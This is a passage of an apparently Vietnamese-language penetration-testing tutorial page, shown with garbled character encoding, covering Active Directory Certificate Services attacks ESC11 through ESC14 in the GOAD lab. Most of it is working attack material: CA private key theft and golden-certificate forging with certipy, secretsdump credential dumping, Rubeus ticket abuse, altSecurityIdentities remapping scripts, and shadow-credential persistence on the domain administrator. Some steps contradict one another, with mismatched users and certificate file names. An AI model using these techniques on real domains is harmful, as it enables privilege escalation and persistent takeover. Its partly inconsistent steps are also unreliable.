                <!-- ESC11: IF_ENFORCEENCRYPTICERTREQUEST -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC11: Khai Th√°c Flag IF_ENFORCEENCRYPTICERTREQUEST</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC11 nh·∫Øm v√†o c√°c CA ƒë∆∞·ª£c c·∫•u h√¨nh v·ªõi Flag IF_ENFORCEENCRYPTICERTREQUEST, c√≥ th·ªÉ b·ªã b·ªè qua trong m·ªôt s·ªë ƒëi·ªÅu ki·ªán nh·∫•t ƒë·ªãnh.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Vector T·∫•n C√¥ng</h3>
                    <p>ESC11 khai th√°c vi·ªác gi·∫£ m·∫°o cu·ªôc g·ªçi RPC khi c√°c y√™u c·∫ßu ch·ª©ng ch·ªâ ƒë∆∞·ª£c truy·ªÅn kh√¥ng ƒë∆∞·ª£c m√£ h√≥a ƒë·∫øn CA.</p>
                    
                    <p>
                        <strong>Quan tr·ªçng:</strong>
                        "y√™u c·∫ßu kh√¥ng ƒë∆∞·ª£c m√£ h√≥a" ch·ªâ th√†nh c√¥ng khi CA c√≥ Flag <code>IF_ENFORCEENCRYPTICERTREQUEST</code>
                        ƒë∆∞·ª£c x√≥a. N·∫øu Flag n√†y ƒë∆∞·ª£c thi·∫øt l·∫≠p (m·∫∑c ƒë·ªãnh an to√†n tr√™n c√°c phi√™n b·∫£n Windows hi·ªán ƒë·∫°i), giao di·ªán RPC bu·ªôc quy·ªÅn ri√™ng t∆∞ g√≥i v√† cu·ªôc t·∫•n c√¥ng NTLM relay s·∫Ω th·∫•t b·∫°i.
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">ƒêi·ªÅu Ki·ªán Ti√™n Quy·∫øt</h3>
                    <p>H√£y ki·ªÉm tra c·∫•u h√¨nh CA trong GOAD. Ki·ªÉm tra xem CA c√≥ Flag IF_ENFORCEENCRYPTICERTREQUEST ƒë∆∞·ª£c x√≥a hay kh√¥ng:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\InterfaceFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\InterfaceFlags REG_DWORD = 0x0 (0)

</code></pre>
                    
                    <p>H0x0 = d·ªÖ b·ªã t·ªïn th∆∞∆°ng (kh√¥ng y√™u c·∫ßu m√£ h√≥a), 0x200 = ƒë∆∞·ª£c tƒÉng c∆∞·ªùng (y√™u c·∫ßu m√£ h√≥a). IF_ENFORCEENCRYPTICERTREQUEST kh√¥ng ƒë∆∞·ª£c thi·∫øt l·∫≠p (Flag s·∫Ω l√† 0x200) - ƒëi·ªÅu n√†y l√†m cho CA d·ªÖ b·ªã t·ªïn th∆∞∆°ng v·ªõi ESC11.</p>
                    <ol>
                        <li>
                            <strong>CA c√≥ Flag IF_ENFORCEENCRYPTICERTREQUEST b·ªã x√≥a</strong>
                            ‚úì
                        </li>
                        <li>
                            <strong>Y√™u c·∫ßu ch·ª©ng ch·ªâ kh√¥ng ƒë∆∞·ª£c m√£ h√≥a</strong>
                            ‚úì
                        </li>
                    </ol>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">K·ªπ Thu·∫≠t B·ªè Qua</h3>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>// Create unencrypted certificate request for GOAD environment
public class ESC11Exploit
{
    public string CreateUnencryptedRequest(string subject, string altname = "administrator@essos.local")
    {
        var request = new CX509CertificateRequestPkcs10();
        var privateKey = new CX509PrivateKey();
        
        // Configure for unencrypted submission to GOAD CA
        privateKey.ProviderName = "Microsoft Software Key Storage Provider";
        privateKey.Create();
        
        request.InitializeFromPrivateKey(
            X509CertificateEnrollmentContext.ContextUser,
            privateKey,
            "");
            
        request.Subject = new CX500DistinguishedName(subject);
        
        // Add SAN for GOAD domain
        var sanExtension = new CX509ExtensionAlternativeNames();
        var altNames = new CAlternativeNames();
        var altNameObj = new CAlternativeName();
        
        altNameObj.InitializeFromString(
            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
            altname);
        altNames.Add(altNameObj);
        
        sanExtension.InitializeEncode(altNames);
        request.X509Extensions.Add(sanExtension);
        
        // Submit without encryption to vulnerable GOAD CA
        return request.Encode();
    }
}
</code></pre>
                    
                    <p>
                        M√£ C# ·ªü tr√™n minh h·ªça c√°ch m·ªôt payload y√™u c·∫ßu ch·ª©ng ch·ªâ (CSR) c√≥ th·ªÉ ƒë∆∞·ª£c x√¢y d·ª±ng. ƒê·ªëi v·ªõi cu·ªôc t·∫•n c√¥ng ESC11 th·ª±c t·∫ø, m·ªôt k·∫ª t·∫•n c√¥ng th∆∞·ªùng s·∫Ω s·ª≠ d·ª•ng m·ªôt c√¥ng c·ª• nh∆∞ <code>ntlmrelayx.py</code>
                        ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh ho·∫∑c c√¥ng c·ª• t√πy ch·ªânh ƒë·ªÉ chuy·ªÉn ti·∫øp x√°c th·ª±c NTLM ƒë·∫øn giao di·ªán <code>ICertRequestD</code>
                        c·ªßa m√°y ch·ªß ADCS qua RPC kh√¥ng ƒë∆∞·ª£c m√£ h√≥a. Khi relay NTLM ƒë∆∞·ª£c thi·∫øt l·∫≠p, c√¥ng c·ª• c·ªßa k·∫ª t·∫•n c√¥ng s·∫Ω g·ª≠i CSR (nh∆∞ c√°i ƒë∆∞·ª£c t·∫°o ra ·ªü tr√™n, th∆∞·ªùng l√† cho m·ªôt t√†i kho·∫£n c√≥ ƒë·∫∑c quy·ªÅn ho·∫∑c m·ªôt t√†i kho·∫£n m√°y v·ªõi SAN h·ªØu √≠ch) thay m·∫∑t cho t√†i kho·∫£n b·ªã chuy·ªÉn ti·∫øp. N·∫øu th√†nh c√¥ng, CA s·∫Ω ph√°t h√†nh ch·ª©ng ch·ªâ cho m·ª•c ti√™u ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh trong CSR, hi·ªáu qu·∫£ l√† n√¢ng cao ƒë·∫∑c quy·ªÅn.
                    </p>
                    </div>
                </section>

                <!-- ESC12: Shell Access to CA Server -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC12: Truy C·∫≠p Shell v√†o M√°y Ch·ªß CA</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC12 l√† m·ª•c ti√™u cu·ªëi c√πng - khi b·∫°n c√≥ quy·ªÅn truy c·∫≠p shell v√†o ch√≠nh m√°y ch·ªß Certificate Authority. V√†o th·ªùi ƒëi·ªÉm n√†y, b·∫°n g·∫ßn nh∆∞ s·ªü h·ªØu to√†n b·ªô h·∫° t·∫ßng PKI.</p>
                    
                    <p>ESC12 c≈©ng ƒë·ªÅ c·∫≠p ƒë·∫øn c√°c l·ªó h·ªïng YubiHSM ƒë∆∞·ª£c ph√°t hi·ªán b·ªüi Hans-Joachim Knobloch, nh∆∞ng Vector t·∫•n c√¥ng c·ª• th·ªÉ n√†y kh√¥ng ƒë∆∞·ª£c tri·ªÉn khai trong m√¥i tr∆∞·ªùng GOAD ti√™u chu·∫©n.</p>
                    
                    <p>
                        Trong GOAD, m√°y ch·ªß CA l√† <code>braavos.essos.local</code>
                        . Gi·∫£ s·ª≠ ch√∫ng ta ƒë√£ x√¢m ph·∫°m n√≥:
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">T·∫°o Ch·ª©ng Ch·ªâ V√†ng (Khi ƒê√£ X√¢m Ph·∫°m Kh√≥a Ri√™ng CA)</h3>
                    <p>
                        Khi b·∫°n c√≥ quy·ªÅn qu·∫£n tr·ªã CA (nh∆∞ <code>khal.drogo</code>
                        trong GOAD), b·∫°n c√≥ th·ªÉ tr√≠ch xu·∫•t kh√≥a ri√™ng c·ªßa CA v√† gi·∫£ m·∫°o c√°c ch·ª©ng ch·ªâ v√†ng:
                    </p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Extract CA certificate and private key with certipy
certipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23 -debug

[*] Action: Backup CA
[*] Backing up CA 'ESSOS-CA'
[*] Saved certificate and private key to 'ESSOS-CA.pfx'

# Forge a certificate as domain admin
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local

[*] Action: Forge Certificate
[*] Forged certificate saved to 'administrator_forged.pfx'

# Authenticate with schannel
certipy auth -pfx administrator_forged.pfx -ldap-shell

[*] Action: Authenticate
[*] LDAP shell available

# add_user newdomainadmin
# add_user_to_group newdomainadmin "Domain admins"

# Alternative: Authenticate with PKINIT
# First request a valid certificate as template
certipy req -u 'khal.drogo@essos.local' -p horse -ca 'ESSOS-CA' -template User -target 192.168.56.23

# Reforge with template to fix CRL issues
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local -template khal.drogo.pfx


Rubeus.exe asktgt /user:administrator /certificate:administrator_forged.pfx /password:mimikatz

# Or use gettgtpkinit.py
gettgtpkinit.py -cert-pfx administrator_forged.pfx -dc-ip 192.168.56.12 "essos.local/administrator" admin_tgt.ccache

export KRB5CCNAME=/workspace/admin_tgt.ccache
secretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">K·ªπ Thu·∫≠t H·∫≠u X√¢m Nh·∫≠p</h3>
                    <p>Sau khi c√≥ quy·ªÅn truy c·∫≠p shell v√†o CA, kh·∫£ nƒÉng l√† v√¥ t·∫≠n. D∆∞·ªõi ƒë√¢y l√† m·ªôt s·ªë k·ªπ thu·∫≠t h·∫≠u x√¢m nh·∫≠p:</p>
                    
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>Tr√≠ch xu·∫•t v√† l·∫°m d·ª•ng kh√≥a ri√™ng c·ªßa CA</li>
                        <li>Gi·∫£ m·∫°o ch·ª©ng ch·ªâ v√†ng cho b·∫•t k·ª≥ ng∆∞·ªùi d√πng n√†o</li>
                        <li>Thao t√°c c√°c m·∫´u ch·ª©ng ch·ªâ v√† c√†i ƒë·∫∑t CA</li>
                        <li>T·∫°o CA gi·∫£ m·∫°o v√† c·∫•p ch·ª©ng ch·ªâ ch√©o v·ªõi CA h·ª£p ph√°p</li>
                    </ul>
                    </div>
                </section>

                <!-- ESC13: Issuance Policy OID Group Links -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC13: Khai Th√°c Li√™n K·∫øt Nh√≥m OID Ch√≠nh S√°ch C·∫•p Ch·ª©ng Ch·ªâ</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>ESC13 khai th√°c t√≠nh nƒÉng c·ªßa ADCS cho ph√©p c√°c m·∫´u ch·ª©ng ch·ªâ c√≥ c√°c ch√≠nh s√°ch c·∫•p ph√°t v·ªõi c√°c li√™n k·∫øt OID ƒë·∫øn c√°c nh√≥m Active Directory. ƒêi·ªÅu n√†y cho ph√©p c√°c nguy√™n t·∫Øc c√≥ ƒë∆∞·ª£c quy·ªÅn truy c·∫≠p nh∆∞ c√°c th√†nh vi√™n c·ªßa c√°c nh√≥m li√™n k·∫øt b·∫±ng c√°ch y√™u c·∫ßu ch·ª©ng ch·ªâ v·ªõi c√°c ch√≠nh s√°ch c·∫•p ph√°t th√≠ch h·ª£p.</p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Chi Ti·∫øt K·ªπ Thu·∫≠t</h3>
                    <p>Cu·ªôc t·∫•n c√¥ng n√†y l·ª£i d·ª•ng t√≠nh nƒÉng ƒê·∫£m b·∫£o C∆° ch·∫ø X√°c th·ª±c c·ªßa Microsoft (AMA) trong ƒë√≥:</p>
                    
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            C√°c m·∫´u ch·ª©ng ch·ªâ ch·ª©a c√°c ch√≠nh s√°ch c·∫•p ph√°t (ƒë∆∞·ª£c l∆∞u tr·ªØ trong thu·ªôc t√≠nh <code>msPKI-Certificate-Policy</code>
                            )
                        </li>
                        <li>
                            C√°c ch√≠nh s√°ch c·∫•p ph√°t c√≥ th·ªÉ ƒë∆∞·ª£c li√™n k·∫øt v·ªõi c√°c nh√≥m AD qua thu·ªôc t√≠nh <code>msDS-OIDToGroupLink</code>
                            </li>
                        <li>Khi x√°c th·ª±c v·ªõi c√°c ch·ª©ng ch·ªâ nh∆∞ v·∫≠y, ng∆∞·ªùi d√πng c√≥ ƒë∆∞·ª£c quy·ªÅn th√†nh vi√™n nh√≥m</li>
                    </ul>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Y√™u C·∫ßu</h3>
                    <ol class="list-decimal list-inside space-y-2 ml-4">
                        <li>
                            <strong>Nguy√™n t·∫Øc c√≥ quy·ªÅn ƒëƒÉng k√Ω</strong>
                            tr√™n m·ªôt m·∫´u ch·ª©ng ch·ªâ
                        </li>
                        <li>
                            <strong>M·∫´u ch·ª©ng ch·ªâ c√≥ ph·∫ßn m·ªü r·ªông ch√≠nh s√°ch c·∫•p ph√°t</strong>
                        </li>
                        <li>
                            <strong>
                                C√°c ch√≠nh s√°ch c·∫•p ph√°t c√≥ th·ªÉ ƒë∆∞·ª£c li√™n k·∫øt v·ªõi c√°c nh√≥m AD qua thu·ªôc t√≠nh <code>msDS-OIDToGroupLink</code>
                                </strong>
                        </li>
                        <li>
                            <strong>Kh√¥ng c√≥ y√™u c·∫ßu c·∫•p ph√°t n√†o</strong>
                            m√† nguy√™n t·∫Øc kh√¥ng th·ªÉ ƒë√°p ·ª©ng
                        </li>
                        <li>
                            <strong>EKUs cho ph√©p x√°c th·ª±c kh√°ch h√†ng</strong>
                        </li>
                    </ol>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Tr√¨nh Khai Th√°c</h3>
                    <p>H√£y ki·ªÉm tra c√°c ƒëi·ªÅu ki·ªán ESC13 trong GOAD:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Find templates with issuance policies linked to groups in essos.local
Import-Module ActiveDirectory

$templates = Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties msPKI-Certificate-Policy -SearchBase "CN=Configuration,DC=essos,DC=local"

foreach ($template in $templates) {
    if ($template.'msPKI-Certificate-Policy') {
        $policies = $template.'msPKI-Certificate-Policy'
        foreach ($policy in $policies) {
            $oid = Get-ADObject -Filter * -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties msDS-OIDToGroupLink | Where-Object {$_.msDS-OIDToGroupLink -and $policy -eq $_.'msPKI-Cert-Template-OID'}
            if ($oid.'msDS-OIDToGroupLink') {
                Write-Host "Template $($template.Name) linked to group: $($oid.'msDS-OIDToGroupLink')"
            }
        }
    }
}

Template ESC13Template linked to group: CN=Enterprise Admins,CN=Users,DC=essos,DC=local

# Perfect! ESC13Template is linked to Enterprise Admins

# Request certificate from vulnerable template
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC13Template

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC13Template
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 17

# Authenticate with certificate to gain Enterprise Admin group membership

Rubeus.exe asktgt /user:administrator /certificate:esc13.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# The TGT now contains Enterprise Admins group membership!
# Verify with whoami /groups after using the ticket

Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...

[*] Action: Import Ticket
[+] Ticket successfully imported!

# Now we have Enterprise Admin privileges in the forest
net group "Enterprise Admins" /domain

Group name     Enterprise Admins
Comment        Designated administrators of the enterprise

Members

-------------------------------------------------------------------------------
Administrator  missandei
The command completed successfully.
</code></pre>
</div>
                </section>

                <!-- ESC14: Shadow Credentials and Advanced Certificate Mapping -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC14: Khai Th√°c Ch·ª©ng Ch·ªâ B√≥ng v√† √Ånh X·∫° Ch·ª©ng Ch·ªâ N√¢ng Cao</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                    <p>
                        ESC14 ƒë·∫°i di·ªán cho c√°c k·ªπ thu·∫≠t l·∫°m d·ª•ng √°nh x·∫° ch·ª©ng ch·ªâ n√¢ng cao v∆∞·ª£t xa c√°c k·ªπ thu·∫≠t c∆° b·∫£n nh∆∞ <code>altSecurityIdentities</code>
                        ƒë√£ ƒë∆∞·ª£c ƒë·ªÅ c·∫≠p trong ESC10. K·ªπ thu·∫≠t n√†y t·∫≠p trung v√†o ch·ª©ng ch·ªâ b√≥ng v√† c√°c k·ªãch b·∫£n √°nh x·∫° ch·ª©ng ch·ªâ ƒë·∫øn t√†i kho·∫£n tinh vi.
                    </p>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Ki·∫øn Th·ª©c K·ªπ Thu·∫≠t</h3>
                    <p>ESC14 khai th√°c c√°c c∆° ch·∫ø √°nh x·∫° ch·ª©ng ch·ªâ n√¢ng cao bao g·ªìm:</p>
                    
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            <strong>Ch·ª©ng Ch·ªâ B√≥ng</strong>
                            : L·∫°m d·ª•ng thu·ªôc t√≠nh <code>msDS-KeyCredentialLink</code>
                            ƒë·ªÉ x√°c th·ª±c d·ª±a tr√™n ch·ª©ng ch·ªâ
                        </li>
                        <li>
                            <strong>√Ånh X·∫° Ch·ª©ng Ch·ªâ N√¢ng Cao</strong>
                            : Manipulation tinh vi c·ªßa m·ªëi quan h·ªá ch·ª©ng ch·ªâ ƒë·∫øn t√†i kho·∫£n
                        </li>
                        <li>
                            <strong>L·∫°m D·ª•ng Ch·ª©ng Ch·ªâ Xuy√™n Mi·ªÅn</strong>
                            : Khai th√°c √°nh x·∫° ch·ª©ng ch·ªâ qua c√°c ranh gi·ªõi mi·ªÅn
                        </li>
                    </ul>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">K·ªãch B·∫£n T·∫•n C√¥ng</h3>
                    <p>
                        <strong>ESC14A - L·∫°m D·ª•ng Ch·ª©ng Ch·ªâ B√≥ng:</strong>
                    </p>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>Nh·ªØng k·∫ª t·∫•n c√¥ng c√≥ quy·ªÅn ghi tr√™n c√°c ƒë·ªëi t∆∞·ª£ng ng∆∞·ªùi d√πng c√≥ th·ªÉ th√™m ch·ª©ng ch·ªâ b√≥ng</li>
                        <li>Cho ph√©p x√°c th·ª±c d·ª±a tr√™n ch·ª©ng ch·ªâ m√† kh√¥ng c·∫ßn ƒëƒÉng k√Ω ch·ª©ng ch·ªâ truy·ªÅn th·ªëng</li>
                        <li>V∆∞·ª£t qua nhi·ªÅu ki·ªÉm so√°t ADCS truy·ªÅn th·ªëng</li>
                    </ul>
                    
                    <p>
                        <strong>ESC14B - √Ånh X·∫° Ch·ª©ng Ch·ªâ N√¢ng Cao:</strong>
                    </p>
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>C√°c k·ªãch b·∫£n √°nh x·∫° ch·ª©ng ch·ªâ tinh vi v∆∞·ª£t xa c√°c k·ªπ thu·∫≠t ESC10 c∆° b·∫£n</li>
                        <li>L·∫°m d·ª•ng ch·ª©ng ch·ªâ xuy√™n mi·ªÅn trong c√°c m√¥i tr∆∞·ªùng ƒëa mi·ªÅn nh∆∞ GOAD</li>
                        <li>C√°c c∆° ch·∫ø b·ªÅn v·ªØng √°nh x·∫° ch·ª©ng ch·ªâ
                        </li>
                    </ul>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Tr√¨nh Khai Th√°c</h3>
                    <p>H√£y ch·ª©ng minh c√°c k·ªπ thu·∫≠t ESC14 trong m√¥i tr∆∞·ªùng GOAD c·ªßa ch√∫ng ta. ESC14A - Manipulation altSecurityIdentities trong GOAD:</p>
                    
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># First, create a computer account for certificate mapping
addcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account esc14computer$ with password Il0veCertific@te.

# Request machine certificate for our created computer
certipy req -target braavos.essos.local -u 'esc14computer$@essos.local' -p 'Il0veCertific@te' -dc-ip 192.168.56.12 -template Machine -ca ESSOS-CA -debug

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\esc14computer$
[*] Template                : Machine
[*] Subject                 : CN=esc14computer, CN=Computers, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 25

# Extract certificate details for mapping
certipy cert -pfx esc14computer.pfx -nokey -out "esc14computer.crt"
openssl x509 -in esc14computer.crt -noout -text

Certificate:
    Data:
        Serial Number: 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11
        Issuer: CN=ESSOS-CA, DC=essos, DC=local
        Subject: CN=esc14computer, CN=Computers, DC=essos, DC=local

# Modify target user's altSecurityIdentities to map to our certificate
$dn = "CN=administrator,CN=Users,DC=essos,DC=local"
$mapping = "X509:&#x3C;I>CN=ESSOS-CA,DC=essos,DC=local &#x3C;S>6100000028f9b2d3c5a1b4e87a00000000000028"
Set-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}

# Authenticate as administrator using our EVIL$ machine certificate

Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!

[*] Action: Ask TGT
[*] Using certificate mapping via altSecurityIdentities
[*] Using PKINIT with etype rc4_hmac and subject: CN=EVIL, CN=Computers, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 6:45:12 PM
  EndTime                  : 1/4/2025 4:45:12 AM
  RenewTill                : 1/10/2025 6:45:12 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">ƒê·ªãnh D·∫°ng √Ånh X·∫° X509 Ch·ª©ng Ch·ªâ</h3>
                    <p>B√†i vi·∫øt tham kh·∫£o cung c·∫•p m·ªôt k·ªãch b·∫£n Python ƒë·ªÉ ƒë·ªãnh d·∫°ng √°nh x·∫° X509 m·ªôt c√°ch ch√≠nh x√°c:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>import argparse

def get_x509_issuer_serial_number_format(serial_number: str, issuer_distinguished_name: str) -> str:
    """
    Formats the X509IssuerSerialNumber for the altSecurityIdentities attribute.
    :param serial_number: Serial number in the format "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11"
    :param issuer_distinguished_name: Issuer distinguished name, e.g., "CN=ESSOS-CA,DC=essos,DC=local"
    :return: Formatted X509IssuerSerialNumber
    """
    serial_bytes = serial_number.split(":");
    reversed_serial_number = "".join(reversed(serial_bytes));
    issuer_components = issuer_distinguished_name.split(",");
    reversed_issuer_components = ",".join(reversed(issuer_components));
    return f"X509:&#x3C;I>{reversed_issuer_components}&#x3C;SR>{reversed_serial_number}";

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Format X509 Issuer Serial Number");
    parser.add_argument("-serial", required=True, help="Serial number in format 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11");
    parser.add_argument("-issuer", required=True, help="Issuer Distinguished Name e.g., CN=ESSOS-CA,DC=essos,DC=local");

    args = parser.parse_args();
    formatted_value = get_x509_issuer_serial_number_format(args.serial, args.issuer);
    print(formatted_value);

# Usage:
python3 x509_issuer_serial_number_format.py -serial "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11" -issuer "CN=ESSOS-CA,DC=essos,DC=local"

X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>110000000000a68816e592b078921100000043
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">S·ª≠a ƒê·ªïi Thu·ªôc T√≠nh LDAP</h3>
                    <p>K·ªãch b·∫£n ƒë·ªÉ s·ª≠a ƒë·ªïi thu·ªôc t√≠nh altSecurityIdentities:</p>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>import ldap3

dn = "CN=khal.drogo,CN=Users,DC=essos,DC=local"
user = "essos.local\\missandei"
password = "fr3edom"
server = ldap3.Server('meereen.essos.local')
ldap_con = ldap3.Connection(server=server, user=user, password=password, authentication=ldap3.NTLM)
ldap_con.bind()

# Set the certificate mapping
ldap_con.modify(dn, {
    'altSecurityIdentities': [(ldap3.MODIFY_REPLACE, 'X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>110000000000a68816e592b078921100000043')]
})

print(ldap_con.result)
ldap_con.unbind()

# Verify the mapping was set
ldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities

[{
  "altSecurityIdentities": [
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>110000000000a68816e592b078921100000043"
  ],
  "dn": "CN=khal.drogo,CN=Users,DC=essos,DC=local"
}]

# Authenticate as khal.drogo using our machine certificate!
gettgtpkinit.py -cert-pem esc14computer.pem -key-pem esc14computer.pem essos.local/administrator admin_shadow.ccache

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting TGT for khal.drogo@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to khal_tgt.ccache
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">Duy Tr√¨ Quy·ªÅn Truy C·∫≠p v·ªõi ESC14</h3>
                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># ESC14 Persistence - Shadow Credentials for Domain Admin
# Add shadow credentials to Domain Admin account (if we have permissions)
python3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12

[*] Target user found: CN=Administrator,CN=Users,DC=essos,DC=local
[*] Adding KeyCredential to the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved certificate to administrator_shadow.crt
[*] Saved private key to administrator_shadow.pem

# This provides persistent access to Domain Admin even after password changes
gettgtpkinit.py -cert-pem administrator_shadow.pem -key-pem administrator_shadow.pem essos.local/administrator admin_shadow.ccache

# ESC14 Advanced Mapping - Multiple Certificate Mappings
# Add multiple certificate mappings for redundancy
$certificates = @(
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b078921100000043",
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b078921100000044",
    "X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b078921100000045"
)

foreach ($cert in $certificates) {
    $currentMappings = (Get-ADUser administrator -Properties altSecurityIdentities).altSecurityIdentities
    $newMappings = $currentMappings + $cert
    Set-ADUser administrator -Replace @{'altSecurityIdentities' = $newMappings}
}

# Verify multiple mappings
Get-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities

X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b078921100000043
X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b078921100000044
X509:&#x3C;I>DC=local,DC=essos,CN=ESSOS-CA &#x3C;SR>6100000000001a68816e592b078921100000045
</code></pre>
                    
                    <h3 class="text-xl text-green-400 font-semibold mb-4">S·ª± Kh√°c Bi·ªát Ch√≠nh So v·ªõi ESC10</h3>
                    <p>ESC14 kh√°c v·ªõi ESC10 ·ªü m·ªôt s·ªë ƒëi·ªÉm quan tr·ªçng:</p>
                    
                    <ul class="list-disc list-inside space-y-2 ml-4">
                        <li>
                            <strong>Ch·ª©ng Ch·ªâ B√≥ng</strong>
                            : S·ª≠ d·ª•ng <code>msDS-KeyCredentialLink</code>
                            thay v√¨ ƒëƒÉng k√Ω ch·ª©ng ch·ªâ truy·ªÅn th·ªëng
                        </li>
                        <li>
                            <strong>L·∫°m D·ª•ng Ch·ª©ng Ch·ªâ Xuy√™n Mi·ªÅn</strong>
                            : Khai th√°c √°nh x·∫° qua c√°c ranh gi·ªõi mi·ªÅn
                        </li>
                        <li>
                            <strong>Duy Tr√¨ Quy·ªÅn Truy C·∫≠p N√¢ng Cao</strong>
                            : Nhi·ªÅu k·ªπ thu·∫≠t √°nh x·∫° cho ƒë·ªô tin c·∫≠y
                        </li>
                        <li>
                            <strong>V∆∞·ª£t Qua C√°c Ki·ªÉm So√°t Truy·ªÅn Th·ªëng</strong>
